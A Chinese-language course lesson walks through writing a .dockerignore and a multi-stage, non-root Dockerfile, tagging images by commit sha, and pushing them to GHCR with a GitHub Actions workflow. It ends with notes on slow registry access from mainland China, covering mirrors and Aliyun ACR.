# 第 207 节课：构建镜像并推仓库

> 第 206 节课机器能替你验证功能。但它验证的是"源码目录里的代码"，不是"要上线的那坨东西"。
> 这节课让机器把源码打成镜像、编上号、推到仓库 —— 从这一步起，**每次上线都有一个可以退回去的版本**。

**建议用时**：120 分钟
**你需要先完成**：第 206 节课（`test.yml` 能跑绿）、第 202 节课（本地能 `docker build` 成功）

---

# 第 0 步：为什么要有这一步（10 分钟）

## 0.1 你现在会什么

**你会本地构建：**

```bash
docker build -t chat-app .
docker run -p 3000:3000 chat-app
```

**能跑起来，但有两个问题：**

```text
① 这个镜像只在你电脑上
② 它没有名字，只有 chat-app 这五个字母
```

## 0.2 你以后会遇到什么

```text
① 你在服务器上 docker compose build，2 核 2G 的机器构建了 6 分钟，网站一直 502
② 你部署了新版本，出问题了，想退回昨天的 —— 但昨天的镜像已经被覆盖了
③ 你有两台服务器（一台测试一台正式），想让它们跑"完全一样"的东西，但无法确认
④ 你想知道"线上这个容器是哪次提交构建的"，查不到
⑤ 客户问"这个 bug 是什么时候上线的"，你只能说"大概上周吧"
```

**这五个场景，靠"本地 build + scp 上去"全都解决不了。**

## 0.3 今天要建立的三个概念

```text
① 构建上下文（build context）：docker build 时"哪些文件会被送到构建引擎"
② 镜像 tag：一个镜像可以有多个名字，名字里能编码"这是哪次提交"
③ 镜像仓库（registry）：专门存镜像的地方，服务器从那里拉
```

**第二个是今天的重点。** tag 打不对，后面所有的"回滚"都是空话。

## 0.4 今天的交付物

| 文件 | 位置 | 内容 |
|---|---|---|
| `Dockerfile` | `ci-lab/` 根目录 | 多阶段构建，跑起来是 node 用户 |
| `.dockerignore` | `ci-lab/` 根目录 | 把 `node_modules` 等挡在构建上下文外 |
| `.github/workflows/build.yml` | `ci-lab/.github/workflows/` | 构建 + 推送到 GHCR |
| 两个 tag | GHCR 上 | `sha-xxxxxxx` 和 `latest` |

**验收标准不是"文件写好了"，是"GHCR 的 Packages 页面能看到两个 tag"。**

---

# 开工卡：这一节在哪台机器、哪个目录做

> **每节开始前先读这张卡。** 环境和你的实际情况不一致，就先解决环境，别往下看。

| 问题 | 答案 |
|---|---|
| **在哪台机器** | **你的 Windows 电脑 + 浏览器（GitHub Packages 页面）。** |
| **用哪个终端** | **Git Bash** + 浏览器。 |
| **现在在哪个目录** | <code>cd "B:/OPC-Distance_study/每周课程/06-上线运维/第30周-持续集成与部署/第01节课/03-练习代码/ci-lab"</code> |
| **本节新建什么** | `Dockerfile`<br>`.dockerignore`<br>`.github/workflows/build.yml` |

## 开工前先跑这一条

确认你没站错地方：

```bash
docker version 2>/dev/null | head -5 || echo "Docker 没启动"
```

**应该看到：**

```text
Client: Docker Engine - Community
 Version: 27.x.x
```

**这一节本地也要能 build**，Docker Desktop 必须启动。

## 如果不对

**`Docker 没启动`** → 打开 Docker Desktop，等鲸鱼变绿再跑。

---

# 第 1 步：先写一个像样的 Dockerfile（20 分钟）

## 1.1 为什么不用最简单的写法

**最简单的 Dockerfile 是这样：**

```dockerfile
FROM node:22
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]
```

**它有三个问题：**

| 问题 | 后果 |
|---|---|
| `COPY . .` 把所有东西都拷进去 | `node_modules`、`.git`、`.env` 全进镜像 |
| 只有一层 | 改一行代码，`npm install` 要重跑一遍（3 分钟） |
| 用 root 跑 | 容器里被攻破就是 root |

**第三个问题在真实服务器上很严重。** 第 225 节课会讲。

## 1.2 `COPY . .` 会拷进去什么

**先做个实验。**

```bash
docker build -t ci-lab:naive .
```

**然后看镜像里有什么：**

```bash
docker run --rm ci-lab:naive ls -la /app
```

**应该看到：**

```text
total 88
drwxr-xr-x    1 root     root          4096 Nov 16 10:22 .
drwxr-xr-x    1 root     root          4096 Nov 16 10:22 ..
-rw-r--r--    1 root     root            42 Nov 16 10:20 .gitignore
drwxr-xr-x    1 root     root          4096 Nov 16 10:22 node_modules
-rw-r--r--    1 root     root           612 Nov 16 10:20 package-lock.json
-rw-r--r--    1 root     root           402 Nov 16 10:20 package.json
-rw-r--r--    1 root     root             0 Nov 16 10:20 README.md
drwxr-xr-x    1 root     root          1024 Nov 16 10:22 src
drwxr-xr-x    1 root     root          4096 Nov 16 10:22 test
```

**看镜像大小：**

```bash
docker images ci-lab:naive
```

**应该看到：**

```text
REPOSITORY   TAG      IMAGE ID       CREATED          SIZE
ci-lab       naive    a1b2c3d4e5f6   10 seconds ago   312MB
```

**312MB。其中大头是 `node_modules` 和 `test/`。**

**再看更严重的问题 —— `.env` 有没有进去：**

```bash
docker run --rm ci-lab:naive ls -la /app/.env
```

**如果输出里有一行 `-rw-r--r-- ... .env`，你的密钥就在镜像里了。**

**⚠️ 这一条要记住：**

> **`COPY . .` 会把工作目录下所有东西都拷进去，包括 `.git` 和 `.env`。**
>
> **镜像一旦推到仓库，任何人都能 `docker pull` 下来解压看内容。** 包括公开仓库的任何人。

## 1.3 写 `.dockerignore`

**它在 `docker build` 里的作用和 `.gitignore` 在 `git add` 里一样：挡在门外。**

**新建 `ci-lab/.dockerignore`：**

```text
node_modules
npm-debug.log
.git
.gitignore
.env
.env.*
!.env.example
test
coverage
dist
.github
README.md
.vscode
```

**逐行读：**

| 行 | 为什么挡 |
|---|---|
| `node_modules` | 容器里要重新装（平台不同，二进制不通用） |
| `.git` | 可能几十 MB，而且会把完整历史带进镜像 |
| `.env` / `.env.*` | **密钥绝对不能进镜像** |
| `!.env.example` | 但示例文件要留（它没有真值） |
| `test` | 生产镜像不需要测试代码 |
| `.github` | CI 配置不需要进镜像 |
| `README.md` | 不需要 |

**`!` 是什么：** 感叹号表示"例外，这个不要忽略"。

**注意顺序：**

```text
.env.*         ← 先忽略所有 .env.xxx
!.env.example  ← 再把 .env.example 排除在忽略之外
```

**反过来的话，`!.env.example` 会被后面的 `.env.*` 覆盖。**

**`.dockerignore` 的规则是"后写的赢"。**

## 1.4 多阶段构建

**为什么叫"多阶段"：一个 Dockerfile 里有多个 `FROM`，前面的阶段只用来"生产文件"，最后一个阶段才是最终镜像。**

**新建 `ci-lab/Dockerfile`：**

```dockerfile
FROM node:22-alpine AS deps

WORKDIR /app

COPY package.json package-lock.json ./

RUN npm ci

FROM node:22-alpine AS runtime

WORKDIR /app

ENV NODE_ENV=production

COPY --from=deps /app/node_modules ./node_modules
COPY package.json ./
COPY src ./src
COPY server.js ./

RUN addgroup -S app && adduser -S app -G app && chown -R app:app /app

USER app

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=10s --retries=3 \
  CMD node -e "fetch('http://127.0.0.1:3000/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"

CMD ["node", "server.js"]
```

**逐段读：**

| 段 | 意思 |
|---|---|
| `FROM node:22-alpine AS deps` | 第一阶段，起名 `deps`。`alpine` 是精简版 Linux，约 50MB |
| `WORKDIR /app` | 之后所有命令都在 `/app` 下执行 |
| `COPY package.json package-lock.json ./` | **只拷这两个**，不拷源码 |
| `RUN npm ci` | 装依赖，这一层会被缓存 |
| `FROM node:22-alpine AS runtime` | 第二阶段，**重新开始**，最终的镜像用这一阶段 |
| `ENV NODE_ENV=production` | 告诉 npm/express "这是生产环境" |
| `COPY --from=deps /app/node_modules ./node_modules` | 从第一阶段把 `node_modules` 拿过来 |
| `COPY src ./src` | 只拷源码 |
| `RUN addgroup -S app && adduser -S app -G app` | 建一个非 root 用户 |
| `chown -R app:app /app` | 把这个用户设成 `/app` 的属主 |
| `USER app` | 之后所有命令都用 `app` 用户跑 |
| `EXPOSE 3000` | 声明"这个镜像用 3000 端口"（文档作用，不真的开放） |
| `HEALTHCHECK ...` | 容器自己定期访问 `/health`，失败就标记 unhealthy |
| `CMD ["node", "server.js"]` | 启动命令，**用 JSON 数组形式** |

**为什么 `CMD` 要用数组：**

```dockerfile
CMD ["node", "server.js"]     ✅ node 是 1 号进程，能收到 SIGTERM
CMD node server.js            ❌ 会被包成 sh -c "node server.js"，node 是 sh 的子进程，信号传不到
```

**信号传不到会怎样：**

```text
docker stop 发 SIGTERM → sh 收到但不转发 → node 不知道要退出
→ 等 10 秒超时 → docker kill 强杀
→ 你的进程没机会保存数据、没机会关连接
```

**第 5 节课的部署脚本会频繁 `restart`，这一条直接影响"重启会不会丢数据"。**

## 1.5 为什么这样分层

**关键在于这两行的顺序：**

```dockerfile
COPY package.json package-lock.json ./
RUN npm ci
...
COPY src ./src
```

**为什么先拷 `package.json` 再拷源码：**

```text
Docker 的缓存规则：某一层变了，它和它后面的所有层都要重建

如果顺序是：
  COPY . .
  RUN npm ci
→ 你改一行 src/price.js
→ COPY 那层变了
→ npm ci 那层跟着重建
→ 每次 build 多花 40 秒

如果顺序是：
  COPY package*.json ./
  RUN npm ci
  COPY src ./src
→ 你改一行 src/price.js
→ package.json 没变 → npm ci 那层用缓存
→ 只有最后的 COPY 重建
→ 每次 build 多花 0.5 秒
```

**实测对比（在 2 核机器上）：**

| 写法 | 改一行代码后重建 | 改依赖后重建 |
|---|---|---|
| `COPY . .` 在前 | 约 45 秒 | 约 45 秒 |
| 分开拷 | 约 1 秒 | 约 45 秒 |

**这就是为什么"分层"值得学。** 它省的不是一次 44 秒，是每天几十次 44 秒。

## 1.6 `/health` 端点必须先有

**`HEALTHCHECK` 打的是 `/health`，你的 `server.js` 里现在没有这个路由。**

**加上：**

```javascript
app.get('/health', (req, res) => {
  res.json({ ok: true, uptime: process.uptime() })
})
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `app.get('/health', ...)` | 一个只返回状态的接口 |
| `ok: true` | 能让调用方一眼判断 |
| `uptime: process.uptime()` | 进程跑了多少秒（排查"是不是刚重启过"） |

**为什么 `/health` 这么重要：**

```text
第 5 节的部署脚本要判断"新版本起来了没有"
第 7 节要判断"部署完整不完整，要不要回滚"
第 221 节要配 UptimeRobot 监控

三个地方都要一个"不用认证、不查数据库、立刻返回"的接口
```

**注意：`/health` 不要查数据库。**

```text
如果它查数据库，数据库慢的时候 /health 也慢
监控会以为"你的应用挂了"，其实是数据库慢
```

**要查依赖，另开一个 `/ready`。** 这是 Kubernetes 的惯例，你现在不用，但名字别混。

## 1.7 本地构建并验证

```bash
docker build -t ci-lab:local .
```

**第一次会很慢（要下载 alpine 和依赖），应该看到：**

```text
[+] Building 42.1s (14/14) FINISHED
 => [internal] load build definition from Dockerfile                0.0s
 => [internal] load .dockerignore                                   0.0s
 => [internal] load metadata for docker.io/library/node:22-alpine   2.1s
 => [deps 1/4] FROM docker.io/library/node:22-alpine@sha256:...     0.0s
 => [deps 2/4] WORKDIR /app                                         0.1s
 => [deps 3/4] COPY package.json package-lock.json ./               0.1s
 => [deps 4/4] RUN npm ci                                          28.4s
 => [runtime 2/6] WORKDIR /app                                      0.0s
 => [runtime 3/6] COPY --from=deps /app/node_modules ./node_modules  1.2s
 => [runtime 4/6] COPY src ./src                                    0.1s
 => [runtime 5/6] COPY server.js ./                                 0.0s
 => [runtime 6/6] RUN addgroup -S app && adduser ...                0.4s
 => exporting to image                                              3.2s
```

**逐行读：**

| 行 | 意思 |
|---|---|
| `[+] Building 42.1s (14/14)` | 总共 14 个步骤，42 秒 |
| `[internal] load .dockerignore` | 先读忽略规则 |
| `[deps 1/4] FROM ...` | 第一阶段第 1 步，拉基础镜像 |
| `[deps 4/4] RUN npm ci 28.4s` | 装依赖，28 秒 —— **最慢的一步** |
| `[runtime 3/6] COPY --from=deps` | 跨阶段复制 |
| `exporting to image` | 把结果打包成镜像 |

**注意 `[deps x/4]` 和 `[runtime x/6]` 的编号是分开的。** 两个阶段的步骤数各自计算。

**再改一行代码，重新 build：**

```bash
echo "// 改一行" >> src/price.js
docker build -t ci-lab:local .
```

**应该看到：**

```text
[+] Building 1.8s (14/14) FINISHED
 => CACHED [deps 1/4] FROM docker.io/library/node:22-alpine@sha256:...
 => CACHED [deps 2/4] WORKDIR /app
 => CACHED [deps 3/4] COPY package.json package-lock.json ./
 => CACHED [deps 4/4] RUN npm ci
 => CACHED [runtime 1/6] FROM ...
 => CACHED [runtime 2/6] WORKDIR /app
 => CACHED [runtime 3/6] COPY --from=deps /app/node_modules ./node_modules
 => [runtime 4/6] COPY src ./src                                    0.1s
 => CACHED [runtime 5/6] COPY server.js ./
 ...
```

**逐行读：**

| 行 | 意思 |
|---|---|
| `1.8s` | 从 42 秒降到 1.8 秒 |
| `CACHED` | 这一层直接复用，没重新执行 |
| `[runtime 4/6] COPY src ./src 0.1s` | **只有这一行没有 CACHED** |

**这就是分层缓存的全部内容：没变的层跳过，变了的层和它之后的层重建。**

**验证镜像大小：**

```bash
docker images ci-lab
```

**应该看到：**

```text
REPOSITORY   TAG      SIZE
ci-lab       local    148MB
```

**312MB → 148MB。**

**再验证 `.env` 没进去：**

```bash
docker run --rm ci-lab:local ls -la /app
```

**应该看到：**

```text
total 60
drwxr-xr-x    1 app      app           4096 Nov 16 10:40 .
drwxr-xr-x    1 root     root          4096 Nov 16 10:40 ..
-rw-r--r--    1 app      app            402 Nov 16 10:40 package.json
drwxr-xr-x    1 app      app           4096 Nov 16 10:40 src
-rw-r--r--    1 app      app            612 Nov 16 10:40 server.js
drwxr-xr-x    1 app      app           4096 Nov 16 10:40 node_modules
```

**注意三点：**

```text
① 没有 .env
② 没有 test/
③ 属主是 app，不是 root
```

**第三条怎么验证：**

```bash
docker run --rm ci-lab:local whoami
```

**应该看到：**

```text
app
```

**如果输出 `root`，说明 `USER app` 没生效（或者写在了 `CMD` 之后）。**

---

# 第 2 步：给镜像编号（20 分钟）

## 2.1 为什么"latest"不够

**`docker build -t ci-lab` 之后，这个镜像的 tag 是 `latest`。**

**问题：**

```text
第 1 天：build + push latest → 线上是 A 版本
第 2 天：build + push latest → 线上是 B 版本，A 的镜像被覆盖（同名）
第 3 天：B 有问题，想回退
        → docker pull ci-lab:latest  → 拿到的是 B
        → 你没有 A 了
```

**"被覆盖"这句话要准确一点：**

```text
在本地：旧的 latest 变成 <none>（悬空镜像），docker image prune 会删掉
在仓库：新 push 的 latest 指向新镜像，旧的 manifest 不再被 latest 引用
        如果它没有别的 tag，会被仓库的清理策略回收
```

**无论是哪种，"你想退回去"这件事都做不到了。**

## 2.2 用 commit sha 当 tag

**`github.sha` 是一次提交的完整哈希（40 位）。**

**在 workflow 里：**

```yaml
      - name: 算出短 sha
        id: vars
        run: echo "short=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `id: vars` | 这一步的 id，后面用 `steps.vars.outputs.short` |
| `${GITHUB_SHA::7}` | bash 语法：取前 7 个字符 |
| `>> "$GITHUB_OUTPUT"` | 写到输出文件，供后面步骤读取 |

**为什么用短 sha：**

```text
完整 40 位：3f7a1c2b9d8e4f5a6b7c8d9e0f1a2b3c4d5e6f7a
短 7 位：   3f7a1c2

人类读得懂，而且在一个仓库里 7 位几乎不会撞
```

**"几乎不会撞"是多少：**

```text
7 位十六进制 = 2680 万种可能
Git 在 1 万个提交内撞的概率极低
真撞了，git 自己会提示 "short object ID is ambiguous"
```

## 2.3 三个 tag，各管什么

**我建议每个镜像打三个 tag：**

```text
ghcr.io/owner/ci-lab:3f7a1c2       ← 精确版本，回滚用这个
ghcr.io/owner/ci-lab:sha-3f7a1c2   ← 同上，加前缀避免和分支名混
ghcr.io/owner/ci-lab:latest        ← 方便人用，永远指向最新
```

**为什么 `sha-` 前缀值得加：**

```text
如果以后你也用分支名当 tag（main、feature-x）
某个分支名正好叫 3f7a1c2 是不太可能
但语义上区分开更好维护

Docker 生态里 sha-xxxxxxx 是一种常见约定
```

**你现在只需要两个：`sha-xxxxxxx` 和 `latest`。**

## 2.4 为什么"能回滚"依赖 sha 而不是 latest

**把回滚的流程写出来，你就明白了。**

**部署时：**

```bash
docker pull ghcr.io/owner/ci-lab:sha-3f7a1c2
docker tag ghcr.io/owner/ci-lab:sha-3f7a1c2 ci-lab:current
docker compose up -d
```

**回滚时：**

```bash
docker pull ghcr.io/owner/ci-lab:sha-a1b2c3d
docker tag ghcr.io/owner/ci-lab:sha-a1b2c3d ci-lab:current
docker compose up -d
```

**如果只有 `latest`：**

```bash
docker pull ghcr.io/owner/ci-lab:latest   # 拉到的是哪个？
docker compose up -d                       # 你只能赌
```

**所以：**

> **`latest` 是"给人看的提示"，`sha-xxx` 是"给机器用的指针"。**
>
> **能回滚的前提是"每一个上线过的版本都有一个不会被覆盖的名字"。**

**第 7 节课的回滚脚本，就是靠"服务器上存着上一次的 sha"来实现的。**

---

# 第 3 步：推送到 GHCR（30 分钟）

## 3.1 GHCR 是什么

**GitHub Container Registry，GitHub 自己的镜像仓库。**

**地址格式：**

```text
ghcr.io/用户名/镜像名:tag
        └──┬──┘ └──┬──┘ └┬┘
          owner    名字  版本
```

**为什么用它（而不是 Docker Hub）：**

| | GHCR | Docker Hub 免费版 |
|---|---|---|
| 私有镜像数量 | 不限 | 1 个 |
| 认证 | 用 `GITHUB_TOKEN`，不用另建账号 | 要建 access token |
| 和仓库的关系 | 就在同一个 GitHub 账号下 | 另一个平台 |
| 国内拉取速度 | 慢 | 慢 |

**成本（会变，以官网为准）：**

```text
公开镜像：存储和流量免费
私有镜像：500MB 免费额度，超出按 GB 计费
```

**你的镜像 148MB，两个版本就是 296MB。** 超过 500MB 之后开始收费，但金额很小。

**如果你频繁 push，可以用"清理旧版本"的策略（第 6.4 节）。**

## 3.2 需要什么权限

**推送镜像需要 `packages: write`。**

**GitHub 的 `GITHUB_TOKEN` 是"每次运行自动生成的临时令牌"，它的权限由 `permissions:` 决定。**

**默认权限取决于仓库设置：**

```text
Settings → Actions → General → Workflow permissions

选项一：Read and write permissions（老默认）
选项二：Read repository contents and packages permissions（新默认，更安全）
```

**不管是哪个，显式写 `permissions:` 最稳。**

**为什么：**

```text
① 不依赖仓库设置（换仓库、换账号都不会变）
② 权限写清楚了，审代码的人一眼看到"这个 workflow 能干什么"
③ 默认权限可能哪天被 GitHub 收紧，显式写就不会被打断
```

## 3.3 写 `build.yml`

**新建 `.github/workflows/build.yml`：**

```yaml
name: build

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read
  packages: write

jobs:
  build:
    name: 构建并推送镜像
    runs-on: ubuntu-latest
    timeout-minutes: 20

    steps:
      - name: 下载仓库代码
        uses: actions/checkout@v4

      - name: 把仓库名转成小写
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: 算出短 sha
        id: vars
        run: echo "short=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

      - name: 登录 GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: 设置 buildx
        uses: docker/setup-buildx-action@v3

      - name: 构建并推送
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: |
            ghcr.io/${{ steps.repo.outputs.name }}:sha-${{ steps.vars.outputs.short }}
            ghcr.io/${{ steps.repo.outputs.name }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: 打印结果
        run: |
          echo "镜像地址：ghcr.io/${{ steps.repo.outputs.name }}"
          echo "版本 tag：sha-${{ steps.vars.outputs.short }}"
```

**逐段读（这是今天最长的一段，慢慢看）：**

| 位置 | 内容 | 为什么 |
|---|---|---|
| `permissions:` | 在 `jobs` **外面**（workflow 级） | 整个 workflow 的所有 job 都用这套权限 |
| `contents: read` | 能读代码 | checkout 需要 |
| `packages: write` | 能写镜像包 | push 到 GHCR 需要 |
| `${GITHUB_REPOSITORY,,}` | bash 的"转小写"语法 | **GHCR 要求镜像名全小写** |
| `docker/login-action@v3` | 官方登录 action | 不要自己写 `docker login` |
| `username: ${{ github.actor }}` | 触发这次运行的用户名 | 用 `GITHUB_TOKEN` 时，用户名随便填一个存在的账号 |
| `password: ${{ secrets.GITHUB_TOKEN }}` | 临时令牌 | **不需要你手动创建任何 secret** |
| `docker/setup-buildx-action@v3` | 装 buildx | `cache-from: type=gha` 需要它 |
| `context: .` | 构建上下文是仓库根目录 | 所以 `Dockerfile` 要在根目录 |
| `push: true` | 构建完直接推 | 不推就只是本地镜像，没用 |
| `tags: \|` | 多行，多个 tag | 一行一个 |
| `cache-from: type=gha` | 从 GitHub Actions 缓存读 | 加速构建 |
| `cache-to: type=gha,mode=max` | 写到 Actions 缓存 | `mode=max` 缓存所有层，不只最终层 |

**`${GITHUB_REPOSITORY,,}` 这一行非常关键。**

**bash 的大小写转换语法：**

```bash
${VAR,,}   全部转小写
${VAR^^}   全部转大写
```

**为什么需要：**

```text
你的 GitHub 用户名可能是 "Keal-24"
github.repository 就是 "Keal-24/ci-lab"
ghcr.io 要求路径全小写
→ ghcr.io/keal-24/ci-lab:latest   ✅
→ ghcr.io/Keal-24/ci-lab:latest   ❌ invalid reference format
```

**这个错误会在 push 那一步才出现，而且报错信息不含"大小写"三个字。**

## 3.4 push 看结果

```bash
git add .
git commit -m "第207节课：构建并推送镜像"
git push
```

**等 2 分钟（第一次构建要装依赖）。**

**Actions 页面：**

```text
build
  #1  第207节课：构建并推送镜像   main   2m 14s  ✅
```

**点进去看 `构建并推送` 那一步的日志：**

```text
Run docker/build-push-action@v6
...
#1 [internal] load build definition from Dockerfile
#1 transferring dockerfile: 1.24kB done
#2 [internal] load metadata for docker.io/library/node:22-alpine
#3 [auth] library/node:pull token for registry-1.docker.io
#4 [deps 1/4] FROM docker.io/library/node:22-alpine@sha256:...
#5 [deps 2/4] WORKDIR /app
#6 [deps 3/4] COPY package.json package-lock.json ./
#7 [deps 4/4] RUN npm ci
#8 [runtime 2/6] WORKDIR /app
#9 [runtime 3/6] COPY --from=deps /app/node_modules ./node_modules
#10 [runtime 4/6] COPY src ./src
#11 [runtime 5/6] COPY server.js ./
#12 [runtime 6/6] RUN addgroup -S app && adduser -S app -G app
#13 exporting to image
#13 pushing layers
#13 pushing manifest for ghcr.io/yourname/ci-lab:sha-3f7a1c2
#13 pushing manifest for ghcr.io/yourname/ci-lab:latest
#13 DONE 12.4s
```

**逐行读：**

| 行 | 意思 |
|---|---|
| `#1 load build definition` | 读 Dockerfile |
| `#2 ... metadata` | 查 `node:22-alpine` 的摘要 |
| `#3 [auth] ... token` | 向 Docker Hub 要一个匿名 token（拉基础镜像） |
| `#7 RUN npm ci` | 装依赖 |
| `#13 pushing layers` | 推层（只推缺的层） |
| `pushing manifest for ...:sha-3f7a1c2` | 推清单（tag 就在这一层） |
| `pushing manifest for ...:latest` | 第二个 tag |
| `DONE 12.4s` | 推完 |

**"只推缺的层"是什么意思：**

```text
基础镜像 node:22-alpine 的层，GHCR 上已经有了 → 跳过
你的 node_modules 层可能是新的 → 推
你的源码层每次都是新的 → 推
```

**这就是为什么第二次构建只要 20 秒，第一次要 2 分钟。**

## 3.5 去 GHCR 看

**路径：**

```text
你的个人主页 → Packages 标签
```

**或者直接访问：**

```text
https://github.com/你的用户名?tab=packages
```

**应该看到：**

```text
ci-lab
Container
2 tags
```

**点进去，看到：**

```text
Tags
  latest      Updated now      148 MB
  sha-3f7a1c2 Updated now      148 MB
```

**注意两个 tag 指向同一个 digest：**

```text
sha256:a1b2c3d4e5f6...
```

**`digest` 是什么：**

```text
镜像内容的哈希
两个 tag 指向同一个 digest = 它们是同一个镜像的两个名字
```

**为什么验证这个很重要：**

```text
如果两个 tag 的 digest 不同，说明你推了两次不同的构建
（同一个 commit 构建两次，理论上 digest 应该一样，但构建时间戳不同会导致不一样）
```

**⚠️ 一个反直觉的点：同一个 commit 构建两次，digest 可能不同。**

```text
因为 npm ci 会写入文件时间戳
Docker 层的内容包含时间戳
→ 哈希变了
```

**这没关系。** 你只关心"sha-3f7a1c2 这个 tag 指向哪一次构建"，不需要"构建可复现"。

**真正的可复现构建需要固定 `SOURCE_DATE_EPOCH` 之类的技巧，你现在不需要。**

## 3.6 在本地拉一下验证

**这一步很重要：证明"别人真的能拉到"。**

**先登出 GHCR（如果你登过）：**

```bash
docker logout ghcr.io
```

**然后拉：**

```bash
docker pull ghcr.io/你的用户名/ci-lab:sha-3f7a1c2
```

**如果镜像是私有的，会失败：**

```text
Error response from daemon: denied
```

**为什么：**

```text
私有包默认只有 owner 能拉
你本地没有凭证
```

**两个选择：**

```text
① 在 GitHub 上把这个 package 设成 public
② 本地 docker login ghcr.io（需要一个有 read:packages 权限的 token）
```

**设成 public 的路径：**

```text
Packages → ci-lab → Package settings → Danger Zone → Change visibility → Public
```

**⚠️ 这一步之前先确认镜像里没有密钥。** 用 1.4 节的方法验证过 `/app` 下没有 `.env` 吗？

**公开之后，拉取：**

```bash
docker pull ghcr.io/你的用户名/ci-lab:sha-3f7a1c2
```

**应该看到：**

```text
sha-3f7a1c2: Pulling from 你的用户名/ci-lab
...
Status: Downloaded newer image for ghcr.io/你的用户名/ci-lab:sha-3f7a1c2
```

**跑一下：**

```bash
docker run --rm -p 3000:3000 ghcr.io/你的用户名/ci-lab:sha-3f7a1c2
```

**另一个终端：**

```bash
curl http://127.0.0.1:3000/health
```

**应该看到：**

```text
{"ok":true,"uptime":3.21}
```

**到这一步，"镜像在仓库里、能拉下来、能跑起来"三件事都验证过了。**

**⚠️ 别忘了关掉那个容器：** 按 `Ctrl + C`，或者 `docker ps` 找到它 `docker stop <id>`。

---

# 第 4 步：国内网络的现实（20 分钟）

## 4.1 三个地方会慢

```text
① 拉基础镜像 node:22-alpine（从 Docker Hub）
② 推镜像到 ghcr.io
③ 拉 npm 包
```

**先看现象。**

**如果 CI 卡在 `#2 [internal] load metadata`：**

```text
#2 [internal] load metadata for docker.io/library/node:22-alpine
```

**一直不动，最后：**

```text
ERROR: failed to solve: node:22-alpine: failed to resolve source metadata for docker.io/library/node:22-alpine: failed to do request: Head "https://registry-1.docker.io/v2/library/node/manifests/20-alpine": dial tcp 44.208.254.194:443: i/o timeout
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `failed to resolve source metadata` | 拿不到基础镜像的信息 |
| `registry-1.docker.io` | Docker Hub 的地址 |
| `dial tcp ...: i/o timeout` | 连不上，超时 |

**如果推镜像时超时：**

```text
ERROR: failed to solve: failed to push ghcr.io/yourname/ci-lab:latest: unexpected status: 502 Bad Gateway
```

## 4.2 能做的四件事

**第一：给 Docker 配置镜像加速器（只影响"拉基础镜像"）。**

**⚠️ 注意：Docker Hub 的国内加速器在 2024 年之后大量下线，能不能用要看当时。** 这一段不要照抄，要试。

**配在 runner 上的写法：**

```yaml
      - name: 配置 Docker 镜像加速（可选）
        run: |
          sudo mkdir -p /etc/docker
          echo '{"registry-mirrors":["https://你的加速器地址"]}' | sudo tee /etc/docker/daemon.json
          sudo systemctl restart docker
```

**⚠️ 两个风险：**

```text
① 加速器地址可能是第三方的，它能替换你拉到的镜像内容（供应链风险）
② systemctl restart docker 会中断当前 runner 上的 docker 服务
```

**我不建议在 CI 里这么干。** 更好的办法是下面这条。

**第二：换一个"国内拉得到"的基础镜像。**

**这不是"镜像加速器"，是"换一个发布方"。**

```dockerfile
FROM node:22-alpine
```

**改成：**

```dockerfile
FROM docker.m.daocloud.io/library/node:22-alpine
```

**⚠️ 这是第三方镜像站，不是你信任的原始发布方。** 用之前要确认：

```text
① 它同步的是官方镜像（看它公布的同步策略）
② 它的 digest 和官方一致（用 docker buildx imagetools inspect 对比）
```

**对比 digest 的命令：**

```bash
docker buildx imagetools inspect docker.m.daocloud.io/library/node:22-alpine
docker buildx imagetools inspect node:22-alpine
```

**两个 `Digest:` 一样，说明内容相同。** 不一样就不要用。

**第三：只重试，不改任何配置。**

**这是最保守的做法，也是最推荐的。**

```text
页面右上角 Re-run jobs → Re-run failed jobs
```

**为什么这是合理的：**

```text
GitHub 到 Docker Hub 的链路时好时坏
重试一次成功的概率不低
而且是"零风险"的（不改任何东西）
```

**第四：给构建加缓存，减少"要拉的东西"。**

**你已经配了 `cache-from: type=gha`。**

**它缓存的是"构建出来的层"，不缓存基础镜像。**

**但基础镜像的层如果在 GHCR 上有，也会跳过推送。**

**所以缓存能减少"推"的量，不能减少"拉基础镜像"。**

## 4.3 推 GHCR 慢的替代方案：阿里云 ACR

**如果你在国内，且镜像要部署到国内服务器，GHCR 会很痛苦。**

```text
服务器拉 ghcr.io 可能 200KB/s，148MB 要 12 分钟
```

**替代方案：阿里云容器镜像服务（ACR）个人版。**

**它免费（有额度和限速，以官网为准），国内拉取快。**

**地址格式：**

```text
registry.cn-hangzhou.aliyuncs.com/你的命名空间/ci-lab:sha-3f7a1c2
```

**用起来和 GHCR 几乎一样，只是三处不同：**

| | GHCR | 阿里云 ACR |
|---|---|---|
| 地址 | `ghcr.io/owner/name` | `registry.cn-hangzhou.aliyuncs.com/ns/name` |
| 用户名 | `github.actor` | 阿里云账号名 |
| 密码 | `secrets.GITHUB_TOKEN` | **单独设的固定密码**（放 secrets） |

**workflow 改成：**

```yaml
      - name: 登录阿里云 ACR
        uses: docker/login-action@v3
        with:
          registry: registry.cn-hangzhou.aliyuncs.com
          username: ${{ secrets.ACR_USERNAME }}
          password: ${{ secrets.ACR_PASSWORD }}
```

**注意：这里用的是**你自己设的两个 secret**，不是 `GITHUB_TOKEN`。**

**为什么：**

```text
阿里云不认识 GitHub 的临时令牌
它只认它自己发的固定密码
```

**⚠️ 固定密码的代价：**

```text
① 它不会自动过期，泄露了就一直有效
② 你要自己记得轮换
③ 它给的权限通常是"整个命名空间"，比 GITHUB_TOKEN 的"单个 package"宽
```

**所以：如果你用 ACR，这个密码要定期换，并且只在必要的 workflow 里用。**

**我这一周的主线用 GHCR。** 因为：

```text
① 不用额外注册账号
② 用 GITHUB_TOKEN，不产生"永久密钥"
③ 学的是"镜像仓库 + tag"这套概念，换平台只是改地址
```

